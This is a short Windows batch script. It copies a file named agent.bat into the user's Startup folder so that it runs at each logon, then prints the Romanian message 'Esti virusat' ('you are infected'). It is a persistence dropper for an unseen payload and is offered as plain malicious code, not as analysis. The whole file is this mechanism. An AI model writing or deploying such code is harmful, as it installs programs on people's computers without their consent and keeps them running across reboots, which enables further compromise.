@echo off
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "source=agent.bat"

if exist "%source%" (
    copy "%source%" "%startup%" /Y
    echo Esti virusat
) else (
    echo Fisierul %source% nu exista!
)
pause
